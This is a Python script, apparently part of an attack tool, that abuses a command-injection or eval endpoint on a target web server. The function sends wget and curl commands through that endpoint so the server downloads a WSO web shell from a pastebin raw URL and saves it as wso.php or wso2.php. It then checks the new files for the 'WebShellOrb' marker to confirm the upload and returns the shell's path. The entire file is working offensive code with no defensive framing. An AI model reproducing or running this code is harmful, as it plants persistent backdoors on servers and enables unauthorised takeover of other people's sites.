import requests

SHELL_URL = "https://pastebin.com/raw/dSpsHaiE"
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def UploadWso(EvalShell):
    try:
        evsh = EvalShell
        EvalShell = EvalShell.split("=")[0] + '='
        if 'system' in evsh:
            return 'No'
        else:
            if EvalShell.startswith('http://'):
                EvalShell = EvalShell.replace('http://', '')
            elif EvalShell.startswith("https://"):
                EvalShell = EvalShell.replace('https://', '')
            else:
                pass
            Method1 = 'wget {} -O wso.php'.format(SHELL_URL)
            Method2 = 'curl -O {};mv dSpsHaiE wso2.php'.format(SHELL_URL)
            requests.get('http://{}{};{}'.format(EvalShell, Method1, Method2), timeout=10, headers=Headers)
            shellpath = EvalShell.replace(EvalShell.split('/')[len(EvalShell.split('/')) - 1], '')
            C1 = requests.get('http://{}wso.php'.format(shellpath), timeout=10, headers=Headers)
            C2 = requests.get('http://{}wso2.php'.format(shellpath), timeout=10, headers=Headers)
            if 'WebShellOrb' in str(C1.content):
                return shellpath + 'wso.php'
            elif 'WebShellOrb' in str(C2.content):
                return shellpath + 'wso2.php'
            else:
                return 'No'
    except:
        return 'No'



